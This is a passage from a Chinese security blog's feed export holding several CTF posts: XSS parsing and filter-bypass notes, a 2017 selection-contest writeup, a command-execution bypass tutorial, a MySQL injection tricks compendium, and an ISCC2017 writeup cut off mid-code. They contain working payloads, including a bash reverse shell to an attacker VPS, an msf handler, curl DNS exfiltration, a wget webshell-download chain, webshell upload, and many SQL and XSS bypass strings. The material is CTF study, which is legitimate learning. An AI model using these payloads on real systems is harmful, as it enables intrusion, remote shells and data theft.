state，然后开始搜寻标签名，（在搜寻标签名的时候，我们要思考一个问题，&lt;和标签名img并不是同一个token，他们显然是分别进行解析的，那么有没有可能忽略掉&lt;和img之间的空格或者换行什么的？这个问题，我相信很好找到答案。） 找到标签名，状态变为Tag name state，这个状态就表示已经识别了标签名， 然后知道读取到最近的一个&gt;时，结束tag name state的状态，重新进入Data State。 有了上面的概念，我们再来理解一下什么时候我们的HTML字符实体在哪些情况下能被浏览器解析一般来说，HTML编码要在Data state（标签外部和标签的text段），RCDATA状态或者标签内的属性值的位置才能解析，然而对于一些特殊情况，例如RCDATA有个特殊的情况。在浏览器解析RCDATA元素的过程中，解析器会进入“RCDATA状态”。在这个状态中，如果遇到“&lt;”字符，它会转换到“RCDATA小于号状态”。如果“&lt;”字符后没有紧跟着“/”和对应的标签名，解析器会转换回“RCDATA状态”。这意味着在RCDATA元素标签的内容中（例如&lt;textarea&gt;或&lt;title&gt;的内容中），唯一能够被解析器认做是标签的就是“&lt;/textarea&gt;”或者“&lt;/title&gt;”。当然，这要看开始标签是哪一个。因此，在“&lt;textarea&gt;”和“&lt;title&gt;”的内容中不会创建标签，就不会有脚本能够执行。 所以就可以合理解释下面的payload能不能弹出payload 再试一下浏览器的解码顺序问题浏览器一般的解码顺序是先进行html解码，在进行javascript解码，最后再进行url解码，这样一步一步下来我们就可以实现这样我们就可以理解为什么下面无法弹出payload1&lt;script&gt;alert&amp;#40;&apos;1&apos;)&lt;/script&gt; 因为script标签内无法解析HTML实体编码，因为其不是在data state数据段内，然而下面的payload又是可以弹的1&lt;svg&gt;&lt;script&gt;alert&amp;#40;&apos;1&apos;)&lt;/script&gt; 有印象的同学应该记得我们在上面说过&lt;svg&gt;属于外部标签，那么我们百度一下SVG到底是一种上面样的标签这里我们可以发现SVG属于支持XML解析，所以那么我们就很好理解了，因为下xml支持在标签内解析HTML实体字符，所以在在XML中&amp;#40;会被解析成（ XSS的小技巧说了这么多理论的东西，估计同学们都烦了，下面来说一下XSS的一般思路吧， 确定我们的输入点在哪里打入常规的payload如1&lt;script&gt;alert(&apos;1&apos;)&lt;/script&gt; 查看源代码查找我们的输出点在哪里，以及是否有过滤之类的 如果是单纯的字符串替换，fuzz一下常用的双写，大小写等方法 如果是过滤了script等标签，我们可以尝试用一些别的标签代替，比如常用的12imgiframe 标签等 如果是过滤了(),我们可以使用反引号`代替()，或者使用 1&lt;iframe srcdoc=&quot;&lt;script&gt;parent.alert&amp;#40;1&amp;#41;&lt;/script&gt;&quot; 还可以使用data协议绕过 1&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiMSIpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt; 如果是过滤了&lt;&gt;,那么看看输出点是否在标签内一般都是通过构造事件onload，或者onclick等事件进行弹窗。 如果是过滤了alert，那么我们也有常用的123confirmthrowpropmt 等 当然一般CTF高分的XSS都是利用一些chrome或者firefox爆出的最新的漏洞，比如上次国赛就是使用chrome的CVE-2017-**漏洞]]></content>
      <categories>
        <category>learning and think</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017网络空间安全实验班选拔赛wp]]></title>
    <url>%2Fshiyanbanwirteup.html</url>
    <content type="text"><![CDATA[渣渣只能膜fish大佬和宋神了，顺便吐槽一下自己的选择题做的是真的垃圾Web01第一题先看源码，得到发现可以用常规思路万能密码绕过构造username=’ or ‘1’=’1’#Password随便即可绕过即可构造出select * from users where name = ‘’ or ‘1’=’1’#andxxxxx因为#是注释所以注释掉了后面语句得到flagflag{justForTestL0g1n} WEB7第二题可以构造后台语句Username=0 union select 1,2,md5(1)#Password=1绕过，得到flag这里可以先猜测数据库有3列，id,username,password,然后通过联合查询使password字段为1的md5值这样通过输入password=1可以实现经过后台逻辑判断可以绕过。flag{Second2@16L0g1n} WEB05上御剑访问robots.txt访问flag.txt Web04这题一开始没啥思路，上御剑扫目录结果发现一个.index.php.swp源码泄露先贴一下源码12345678910111213141516171819202122232425262728293031&lt;?php if ("POST" == $_SERVER['REQUEST_METHOD']) &#123; $password = $_POST['password']; if (0 &gt;= preg_match('/^[[:graph:]]&#123;16,&#125;$/', $password)) &#123; echo '鐪熺殑鍚楋紒锛 '; exit; &#125; while (TRUE) &#123; $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array('punct', 'digit', 'upper', 'lower'); foreach ($ps as $pt) &#123; if (preg_match("/[[:$pt:]]+/", $password)) $c += 1; &#125; if ($c &lt; 3) break; if ("2017" == $password) &#123; include_once("flag.php"); echo $flag; &#125; else echo 'Duang锛侊紒锛 '; exit; &#125; &#125; ?&gt; 审计源码，这里我不知道graph是啥意思(后来知道了是除(空格键与[TAB]键)之外的所有按键） )。只好fuzz，fuzz了半天发现原来是要输入超过16位，而且必须结果等于2017，这里我当时想到了俩个思路一个是0x7E1另外一个是2017.0000000000000000001后面有说必须要有标点，大小写，数字一大堆的，了解了原理，本地搭建一个环境进行fuzz一下 结果发现本地fuzz出一个，结果弄进去不给我过ORZ10x7E1&amp;111111111111 继续fuzz半天发现了一个发现2017.0000000000是等于2017然而缺少字母，想到了eN等于10的N次方所以最后的payload120170.000000000000000000000e-1 web02 抽奖这题没毛病，以前打陕西省网络空间安全的时候做的题，这次再做的时候莫名其妙找不到JSFuck了，晕，幸好本地正好直接有当时的wp，随手试了试了一下当时的flag发现直接可以过，(吐槽一下出题人真是懒，flag都没改)这里贴一个链接，感兴趣的小伙伴可以去看一下http://blog.csdn.net/qq_35078631/article/details/70256502 Web03这题没撸了好长没弄出来，就先说一下思路吧，首先御剑扫到了一个flag.php,所以我们尝试读取flag.php，但是好像做了黑名单检测，就是读不了,这里我尝试了一下../发现貌似会被替换为空，然而放在tes../t.txt文件就不存在了，ORZ。然后00截断啥的尝试了一下也没啥用就放弃了。。 cipher0x第一题提示放射密码，直接用上学期老胡布置的作业的完整版本程序跑一下就好了,源码如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;ctype.h&gt;#include&lt;stdlib.h&gt;void sttub(int t,int s);void sttuben();void sttuban();char p[1000],str[1000]=&#123;0&#125;,q[1000]=&#123;0&#125;;int count[26]=&#123;0&#125;,k1[12]=&#123;1,3,5,7,9,11,15,17,19,21,23,25&#125;;int k2,k3,c,i,n,t,s,ch;int main()&#123; printf("选择一种模式：1—&gt;加密，2—&gt;解密，3—&gt;暴力破解，4—&gt;字频破解\n"); scanf("%d",&amp;c); switch(c) &#123; case 1: &#123; system("color E"); printf("请输入明文\n"); fflush(stdin); gets(p); ch=strlen(p); printf("请输入密钥\n"); scanf("%d,%d",&amp;t,&amp;s); for(n=0;n&lt;ch;n++) &#123; if((p[n]&gt;='A')&amp;&amp;(p[n]&lt;='Z')) str[n]=(t*(p[n]-'A'+s))%26+'A'; else if((p[n]&gt;='a')&amp;&amp;(p[n]&lt;='z')) str[n]=(t*(p[n]-'a'+s))%26+'a'; else str[n]=p[n]; &#125; printf("密文：%s\n",str); &#125;break; case 2: &#123; system("color A"); printf("请输入密文\n"); fflush(stdin); gets(p); ch=strlen(p); printf("请输入密钥\n"); scanf("%d,%d",&amp;t,&amp;s); sttub(t,s); printf("%s\n",str); &#125;break; case 3: &#123; system("color C"); fflush(stdin); printf("请输入需要破解的密文\n"); gets(p); ch=strlen(p); sttuben(); &#125;break; case 4: &#123; system("color E"); printf("请输入需要破解的密文\n"); fflush(stdin); sttuban(); &#125; &#125;&#125;void sttub(int t,int s)&#123; for(k3=0;k3&lt;1000;k3++) if((t*k3)%26==1) break; for(n=0;n&lt;ch;n++) &#123; if((p[n]&gt;='A')&amp;&amp;(p[n]&lt;='Z')) str[n]=(k3*(p[n]-'A'-s)+2600000)%26+'A'; else if((p[n]&gt;='a')&amp;&amp;(p[n]&lt;='z')) str[n]=(k3*(p[n]-'a'-s)+2600000)%26+'a'; else str[n]=p[n]; &#125;&#125;void sttuben()&#123; for(i=0;i&lt;12;i++) for(k2=0;k2&lt;26;k2++) &#123; sttub(k1[i],k2); if(strstr(str,"FLAG")||strstr(str,"flag")) printf("该句含FLAG: &#123; %s &#125;\n",str); else printf("%s ",str); &#125;&#125;void sttuban()&#123; int x,y; int max=0,min=100000; gets(p); ch=strlen(p); for(i=0;i&lt;ch;i++) q[i]=toupper(p[i]); for(i=0;i&lt;ch;i++) if((q[i]&gt;='A')&amp;&amp;(q[i]&lt;='Z')) count[q[i]-'A']++; for(i=0;i&lt;26;i++) &#123; if(count[i]&gt;max) &#123; max=count[i];x=i; &#125; if(count[i]&lt;min) &#123; min=count[i];y=i; &#125; &#125; for(i=0;i&lt;12;i++) for(k2=0;k2&lt;26;k2++) if((x==((k1[i]*('E'-'A')+k2)%26))&amp;&amp;((y==((k1[i]*('Z'-'A')+k2)%26)))) &#123; t=k1[i];s=k2; printf("%d %d\n",t,s); break; &#125; sttub(t,s); printf("%s\n",str); for(i=0;i&lt;26;i++) printf("%c--&gt;%d\n",i+'A',count[i]);&#125; 网信 007这题用wireshark追踪一下tcp流，在发现传输了一个hello.txt和secret.png的图片，在20流左右发现了png的16进制右键以原始数据流的形式提取出来，打开发现flag 真有这么难?这题真的不记得了，下载下来发现有个zip，好像flag.txt藏在其中一个文件夹里面 编程小练习只能说这题太恶心了，最后一次机会才试出来，差点给跪，原来要加flag{Akye}123str = 'balabalabalabala'print str[98]+str[300]+str[1200]+str[1332]]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈CTF中命令执行与绕过的小技巧]]></title>
    <url>%2Fshellcode.html</url>
    <content type="text"><![CDATA[浅谈CTF中命令执行与绕过的小技巧缘起lemon师傅在安全客里发表的一篇文章，总结的很详细，学到了很多姿势。但是在此我还想画蛇添足的做一些补充及解释。补充一下命令执行的漏洞空格绕过&lt; 符号 %09 符号 需要php环境，这里就不搭建啦，见谅) $IFS$9 符号${IFS} 符号 这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，然而我本地实验却会发生这种情况，这里解释一下,单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。命令分隔符这里介绍5种姿势%0a 符号 （需要php环境，这里就不搭建啦，见谅）%0d 符号 （需要php环境，这里就不搭建啦，见谅）; 符号 在 shell 中，担任”连续指令”功能的符号就是”分号”&amp; 符号 &amp; 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。进程切换到后台的时候，我们把它称为job。切换到后台时会输出相关job信息，这里36210就是该进程的PID| 符号 管道符左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示 命令终止符12%00%20# （需要php环境，这里就不搭建啦，见谅） 黑名单绕过a=l;b=s;$a$bbase64编码 无回显的命令执行，这里先给一个bugku平台的靶机地址http://47.93.190.246:49165/这里第一步先用username=0’ union select 1,md5(1)#password=1绕过，就可以到命令执行界面然而尝试一下发现没有回显这里有3种方法 第一种是利用bash命令并在本地进行nc监听结果查看回连日志，然后就行先在vps处用nc进行监听1nc -l -p 8080 -vvv 然后在靶机命令执行处输入1|bash -i &gt;&amp; /dev/tcp/xxxxxI(你的vps的公网ip)/8080 0&gt;&amp;1 第二种是msg反向回连同样vps用msg监听12345678vps的msf监听：use exploit/multi/handlerset payload linux/armle/shell/reverse_tcpset lport 8080set lhost xxx.xxx.xxx.xxxset exitonsession falseexploit -j 然后在靶机命令执行处输入1|bash -i &gt;&amp; /dev/tcp/xxxxxI(你的vps的公网ip)/8080 0&gt;&amp;1 即可getflag 第三种是利用DNS管道解析这里提供一个在线网址，可以直接进行给一个利用网址admin.dnslog.link注册一个账号后会分配一个子域名可以利用|curl whoami.xxxx.xxx(子域名)这样就会在利用网址看到反弹结果。（这里也不演示了，账号忘记了。。。）这里解释一下whoami因为`反引号在linux下是执行命令的特殊符号 七个字的命令执行这题是p总在小密圈发表的一篇文章，当时没有做出来，这题是利用重命名文件绕过的，所以可以这样进行调用，因为限制了命令的长度，所以无法直接构造，只能通过文件构造 这里先介绍一下小技巧，linux下创建文件的命令可以用1&gt;1创建文件名为1的空文件进一步fuzz发现a&gt;1居然也可以，虽然会报错，但是还是可以创建空文件。ls&gt;1可以直接把把ls的内容导入一个文件中,但是会默认追加\n有了这个基础我们再来看这道题12345&lt;?phpif(strlen($_GET[1])&lt;8)&#123; echo shell_exec($_GET[1]);&#125;?&gt; 简单的代码，可以利用1234567891&gt;wget\1&gt;域名.\1&gt;com\1&gt;-O\1&gt;she\1&gt;ll.p\1&gt;pls&gt;ash a 这里注意.不能作为文件名的开头，因为linux下.是隐藏文件的开头，ls列不出来 然而这里还有个问题，就是ls下的文件名是按照字母顺序排序的，所以需要基于时间排序1ls -t&gt;a 网络地址转化为数字地址网络地址有另外一种表示形式就是数字地址比如127.0.0.1可以转化为2130706433可以直接访问http://2130706433或者http://0x7F000001这样就可以绕过.的ip过滤，这里给个转化网址http://www.msxindl.com/tools/ip/ip_num.asp GCTF RCE这题过滤了很多东西,下面说一下比较重要的1||&amp;|;|%&#123;&#125;| |&apos;&apos;|.| 这里给个payload123%0acat%09%0Acat$IFS$9%0acat 用%0a绕过curl然后在从我前面绕过空格的payload中随便挑一个没有过滤的 最后总结一下，做命令执行的题首要的是寻找命令执行的点，然后去猜测他的后台语句是如何构造的，过滤了哪些，还剩哪些可以用，这样一个一个排除，最后大都能找出payload]]></content>
      <categories>
        <category>learning and think</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈mysql注入下的一点淫技]]></title>
    <url>%2Fmysqltrick.html</url>
    <content type="text"><![CDATA[最近花了一点时间总结了各大平台中注入的trick，自己还是太菜了，多半都得看题解，就特此做了一个paper方便总结 简单的绕过1234双写 selselectct内联注释 /!**/大小写 Select编码 注释符以下是Mysql中可以用到的单行注释符： 123# -- -;%00 以下是Mysql中可以用到的多行注释符(mysql下需要闭合)： 12/*` 判断当前库是否有字段名对于CTF中的题，某些可以直接判断有无flag表1’ or(flag)例如:全表用or试一下这里解释一下为什么or的结果为什么不全，说白了也就是atoi函数的特性 or(列名)其实是遍历字段名中的每个值然后选取那些不为false的内容，因为在mysql中’ssdd’字符串默认等于0等于false所以不显示，而’4ddf’这样的字符串默认等于4，也就是true也就会返回了 limit下的字段数判断众所周知where条件下的字段数可以用order by判断，而limit后可以利用 1,into @,@ （@为字段数）判断字段数@为mysql临时变量，原理请看http://www.w3school.com.cn/sql/sql_select_into.asp or条件下的回显以前总是对where id=&#39;1&#39; or &#39;1&#39;=&#39;1&#39;和where id=&#39;0&#39; or &#39;1&#39;=&#39;1&#39;的回显一直不是很了解，所以今天搭建环境测试了一下，如下可见所以猜测在or条件下前后如果都为真则返回所有结果，否则只返回条件为真的一方的值 concat与concat_ws与group_concat1.2 MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL1mysql&gt; select concat(&apos;11&apos;,&apos;22&apos;,null);+------------------------+| concat(&apos;11&apos;,&apos;22&apos;,null) |+------------------------+| NULL |+------------------------+1 row in set (0.00 sec) 和concat不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL1mysql&gt; select concat_ws(&apos;,&apos;,&apos;11&apos;,&apos;22&apos;,NULL);+-------------------------------+| concat_ws(&apos;,&apos;,&apos;11&apos;,&apos;22&apos;,NULL) |+-------------------------------+| 11,22 |+-------------------------------+1 row in set (0.00 sec) 盲注下的条件语句和时间函数这是我前几天刷wechall碰到的题，例如一下注入语句 1select * from test1 where id=&apos;$_GET[id]&apos;; 已知没有回显位,id=3和id=1返回结果不一样并且过滤了’,空格，等等一堆关键词，不存在宽字节注入给个B师傅当时的payload 1if(substr(flag,1,1)in(0x41),3,0) 写个脚本爆破之可得flag而基于时间的注入以前都是一直用的if(xxxxxx,1,sleep(2));最也发现了一个更好的函数BENCHMARK 1IF(left(version(),1,1)=5, BENCHMARK(100000,SHA1(&apos;1&apos;)), 1) BENCHMARK函数是指执行某函数的次数，次数多时能够达到与sleep函数相同的效果 逻辑操作符被过滤先放一波like语法http://www.runoob.com/mysql/mysql-like-clause.html 绕过’被过滤hex编码 1SELECT password FROM Users WHERE username = 0x61646D696E char编码 1SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) html实体字符编码 1SELECT FROM Users WHERE username = &amp;#39;admin&amp;#39; %2527 1这里主要是因为绕过magic_quotes_gpc过滤，因为%25解码为%,结合后面的27也就是%27也就是&apos;，所以成功绕过过滤。 宽字节就不说了gbk编码在单引号前面加一个%df即可 表名等关键字被过滤以information_schema.tables为例空格 information_schema . tables着重号 information&lt;/em&gt;schema.tables特殊符 /!informationschema.tables/别名 information_schema.(partitions),(statistics),(keycolumnusage),(table_constraints) 表单认证绕过这里选两题一题是实验吧的web分类第一题 1&quot;SELECT username FROM users WHERE username=&apos;$username&apos; AND password=&apos;$password&apos;&quot; 这样的直接username=admin&#39;#即可，或者username=&#39;=&#39;&amp;password=&#39;=&#39;这样就能构造出 1&quot;SELECT username FROM users WHERE username=&apos;&apos;=&apos;&apos; AND password=&apos;&apos;=&apos;&apos;&quot; 所以逻辑判断绕过第二题是iscc的简单注入,猜测大致后台语句如下，PS:后台密码是md5处理过的 1234$results = SELECT password FROM users WHERE username=&apos;$username&apos;if($results==$_GET[$password])&#123; getflag();&#125; 这里可以构造username=0&#39; union select md5(1)#&amp;password=1 Mysql字符编码利用技巧传入的username=admin%c2，php的检测if ($username === ‘admin’)自然就可以绕过的，在mysql中可以正常查出username=’admin’的结果，原理是Mysql在转换字符集的时候，将不完整的字符给忽略了。具体可参照P师傅文章https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html 隐式类型转换这里先上几个图，自行体会精神这里为什么我们输入为什么name=0会导致返回数据呢？其实这里跟php弱类型有异曲同工之妙，mysql在比较一个整数和一个字符串也会强制把字符串转化为整数进行比较，并返回一个warning，所以这里 12pupiladmin 都会被转换为0所以与0比较相等，那么我们进一步猜想那一个非0开头的字符串强制转化是什么呢由此可见，与PHP一样，mysql也会把字符串强制转化为开头的数字，若开头是字母则强制转化为0，那我们怎么利用这一黑魔法呢，众所周知，mysql一般都是字符型注入，很少有数字型注入的，就像where username=&#39;input&#39;这样，我们单纯的输入数字是会被转化成字符串的，就像这样这时候我们就需要做一些操作来构造注入点了，比如利用算术运算符 1+,-,*,/,% 又或者位操作符 1&amp;,|,^ 下面我们以+为例进行演示 过滤了&amp;,|,*,/,=等逻辑处理字符可以用in,exists,position..in,&gt;,&lt;,!,&lt;&gt;,like等操作符绕过这个链接有详细介绍http://www.runoob.com/mysql/mysql-like-clause.html这里举一个例子，比如要使用sql盲注的话但是过滤了substr,mid，asccii,ord等函数可以使用一下语句 1admin&apos; AND password LIKE &quot;p%&quot; -- 过滤了information_schema.tables,(),limit 这类的可以使用orderby注入，利用desc的返回值不同进行盲注。过滤了12345or#-- % 之类的可以尝试布尔型盲注，因为mysql下存在一个小特性就是1username=&apos;&apos;=0 会返回除username=’’之外的所有结果1username=&apos;&apos;=1 会返回username=’’的结果所以可以利用payload1username=&apos;&apos;=(1)=&apos;1&apos; 一点实战例子陕西省网络空间安全过滤了 1/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|&quot;.urldecode(&apos;%09&apos;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&apos;%0c&apos;).&quot;|&quot;.urldecode(&apos;%0d&apos;).&quot;|&quot;.urldecode(&apos;%a0&apos;).&quot;/i&quot; 这里没有过滤^,所以可以绕过，payload 1username=admin&apos;^(ascii(mid((passwd)from(1)))&gt;=10)^&apos;1&apos;=&apos;1 pwnhubcuit校赛过滤了 12345/ |\*|#|,|union|like|sleep|regexp|left|right|strcmp|substr|=|limit|instr|benchmark|oct|\/|format|lpad|rpad|mod|insert|lower|bin|mid|hex|substring|ord|and|field|file|ascii|char|—|\|&amp;|&quot;.urldecode(&apos;%09&apos;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&apos;%0c&apos;).&quot;|&quot;.urldecode(&apos;%0d&apos;).&quot;|&quot;.urldecode(&apos;%20&apos;).&quot;|&quot;.urldecode(&apos;%a0&apos;).&quot;/i 这里过滤了&amp;,|,*,=等符号和substring,mid可以使用in,exists,&gt;,&lt;,&lt;&gt;,比较运算符绕过，payload 1&apos;where((table_schema)in(0x6261636b656e64)))r)where((table_name&lt;0x74)))&gt;0x&#123;0&#125;)&apos; webhacking,kr过滤了 12union|and|||&amp;|=|urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&apos;%0c&apos;).&quot;|&quot;.urldecode(&apos;%0d&apos;).&quot;|&quot;.urldecode(&apos;%20&apos;).&quot;|&quot;.urldecode(&apos;%a0&apos;).|/**/|/i 这里这里if和substr都没被过滤，并且空格可以被%0a绕过,所以payload 1%0aor%0aif(substr((select%0aflag%0afrom%0aprob13password),1,1)in(&quot;0x41&quot;),1,0) 列名被过滤的情况下使用1select mima from (select 1,2 as mima,3 union select * from test1) as twoname; 的列名别名获取库名1id=a() 获取表名1multiPolygon(id) multilinestring(id) linestring(id) GeometryCollection(id) MultiPoint(id) polugon(id) 获取字段名1pro_id=1 union select * from (select * from product_2017ctf as A join product_2017ctf as B using(pro_id)) as C 获取内容1pro_id=1 union select * from (select * from product_2017ctf as A join product_2017ctf as B using(pro_id)) as C 火种CTF1过滤了1(),limit,information 这里一般套路是看回显位，可以使用mysql的order by注入去进行盲注payload1union select 1,2,&apos;&#123;&#125;&apos; order by 3#.format(string) 火种CTF2过滤了123456or#--空格% 可以使用一个MySQl的特性进行布尔盲注12username=&apos;&apos;=0=1username=&apos;&apos;=0=1 payload1&apos;\&apos;=(mid((select(pass)from(admin))from(%d))=\&apos;%s\&apos;)=\&apos;0&apos; % (i,c+password)) 最后总结一下注入题（手工注入。。）的一般思路（大牛轻喷），对于一般注入首先要找到注入点，比如有很多参数的先确定哪个参数好注入，再尝试有无过滤或者过滤了那些字符，waf本身是否有问题导致直接可以大小写，双写，编码绕过的。当然一般ctf中的题注入如果有waf一般都是过滤不完全的，耐心点就可以找出payload，最后就是注意一下参数提交的方式，有时候一些题目get方式过滤的很严格然而post只是象征性的过滤一下，还有一些用$_REQUEST方式的注意除了get和post还可以尝试cookie注入。]]></content>
      <categories>
        <category>learning and think</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ISCC2017Web writeup]]></title>
    <url>%2FISCC.html</url>
    <content type="text"><![CDATA[感谢最后来自逆向队友的助攻，侥幸拿了第54名，Web狗看逆向很是头大 Basic01 Wheel Cipher 50身为二战时期的密码专家，你截获了通信员身上的一段密文、密钥序列和加密列表。你能看懂吗？由提示Wheel Cipher可知是转轮密码谷歌一下 解密方法：将加密表根据密匙的数字顺序排序。每一行相当于一个滚轮，字母是环形首尾相接排列的，按照密文将加密表每一行重新排列，使第一个字母符合密文，排列时当作一个环进行排列。排好后按列读出，看看哪列成句子。123456789101112132: &lt; N ACZDTRXMJQOYHGVS FUWIKPBEL &lt;3: &lt; F HTEQGYXPLOCKBDMA IZVRNSJUW &lt;7: &lt; Q GWTHSPYBXIZULVKM RAFDCEONJ &lt;5: &lt; K CPMNZQWXYIHFRLAB EUOTSGJVD &lt;13： &lt; S XCDERFVBGTYHNUMK ILOPJZQAW &lt;12： &lt; E IURYTASBKJDFHGLV NCMXZPQOW &lt;9: &lt; V UBMCQWAOIKZGJXPL TDSRFHENY &lt;1: &lt; O SFEZWAXJGDLUBVIQ HKYPNTCRM &lt;8: &lt; Q NOZUTWDCVRJLXKIS EFAPMYGHB &lt;10: &lt; O WTGVRSCZQKELMXYI HPUDNAJFB &lt;4: &lt; F CUKTEBSXQYIZMJWA ORPLNDVHG &lt;11： &lt; N BVCXZQWERTPOIUYA LSKDJFHGM &lt;6: &lt; P NYCJBFZDRUSLOQXV ETAMKGHIW &lt; 得到flag FIREINTHEHOLE Basic02 100这题先爆破出密码BIT然后打开文件base64解码一下得到flag Basic03 100下载下来得到一串数字。。。感觉有点像16进制，但转码得不到什么实质性的东西，突然发现开头是504B，是.zip的头，估计就是文件的16进制保存为zip格式，结果有密码，爆破吧得到flag:daczcasdqwdcsdzasd Basic04 你猜猜 10016进制先转字符串得到文件头PK可知是zip文件,所以直接用hex新建一个文件把16进制导入然后生成一个zip文件由题目提示”你猜猜”猜解压密码为弱口令,123456flag daczcasdqwdcsdzasd Basic05 神秘图片 100下载得到一张图片hex查看无果，binwalk一下发现是双图提取出另一个png猪圈密码解一下flag goodluck Basic06 告诉你个秘密 100提示简单加密给了2行16进制16进制分别解密为字符串得到12cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g 然后base64解密一下12r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM 然后键盘密码得知flag TONGYUAN Basic07 php_encrypt_1加密脚本123456789101112131415161718192021&lt;?phpfunction encrypt($data,$key)&#123; $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str);&#125;?&gt; 直接根据加密写解密脚本即可1234567891011121314151617181920212223&lt;?phpfunction decrypt($data)&#123; base64_decode($data) $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) - ord($char[$i]) + 128) % 128); &#125; echo $str;&#125;decrypt('fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=');?&gt; Basic08 二维码 150扫出来1The password of the router is our flag binwalk提取出zip不贴图了然后弱口令爆破，过程与前面一题差不多就不贴图了flag ISCC16BA Web签到题，来和我换flag啊！ 100http://139.129.108.53:3190/web-02/右键查看源码发现有一个hiddenflag，同时提交f1ag发现说不够诚意然后就懵逼了半天，结果fuzzing半天还有个FLAG参数，报警了。。。，再提交FLAG=f1ag可在响应头中得到flag Welcome to MySQL! SQL inject? 150这题题目坑了我好久题目说是sql注入结果是文件上传首先用php5绕过文件上传上传一个一句话然后用菜刀连接，在上级目录下发现存在一个base.php1234567&lt;?php $servername="localhost"; $username="iscc2017"; $password="iscc2017"; $db="flag"; $tb="flag";?&gt; 然后获得数据库账号和密码，然后直接用菜刀右键连接数据库可在数据库中得到flag1Flag:&#123;Iscc_1s_Fun_4nd_php_iS_Easy&#125; where is your flag 150扫目录发现一个flag.php页面访问得到thisisflag然后返回index.php进行注入发现有宽字节注入，sqlmap加tamper应该也是能跑的，但是我习惯手工注入了，所以直接构造payload得到flag:{441b7fa1617307be9632263a4497871e} 我们一起来日站 150先用御剑扫目录得到robots然后再用御剑扫后台地址1http://139.129.108.53:5090/web-04/21232f297a57a5a743894a0e4a801fc3/admin.php 然后在密码处用万能密码登陆1123&apos; or &apos;1&apos;=&apos;1 得到flag1Flag:&#123;ar32wefafafqw325t4rqfcafas&#125; I have a jpg,i upload a txt. 200小明发现，php将上传的jpg文件流写入一个txt中，再重命名后缀为jpg还可以正常读取，于是写了一段上传代码，会不会有什么漏洞呢？先贴源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121&lt;html&gt;&lt;body&gt;&lt;?phpinclude 'hanshu.php';if(isset($_GET['do']))&#123; $do=$_GET['do']; if($do==upload) &#123; if(empty($_FILES)) &#123; $html1=&lt;&lt;&lt;HTML1 &lt;form action="index.php?do=upload" method="post" enctype="multipart/form-data"&gt; &lt;input type="file" name="filename"&gt; &lt;input type="submit" value="upload"&gt; &lt;/form&gt;HTML1; echo $html1; &#125; else &#123; $file=@file_get_contents($_FILES["filename"]["tmp_name"]); if(empty($file)) &#123; die('do you upload a file?'); &#125; else &#123; if((strpos($file,'&lt;?')&gt;-1)||(strpos($file,'?&gt;')&gt;-1)||(stripos($file,'php')&gt;-1)||(stripos($file,'&lt;script')&gt;-1)||(stripos($file,'&lt;/script')&gt;-1)) &#123; die('you can\' upload this!'); &#125; else &#123; $rand=mt_rand(); $path='/var/www/html/web-03/uploads/'.$rand.'.txt'; file_put_contents($path, $file); echo 'your upload success!./uploads/'.$rand.'.txt'; &#125; &#125; &#125; &#125; elseif($do==rename) &#123; if(isset($_GET['re'])) &#123; $re=$_GET['re']; $re2=@unserialize(base64_decode(unKaIsA($re,6))); if(is_array($re2)) &#123; if(count($re2)==2) &#123; $rename='txt'; $rand=mt_rand(); $fp=fopen('./uploads/'.$rand.'.txt','w'); foreach($re2 as $key=&gt;$value) &#123; if($key==0) &#123; 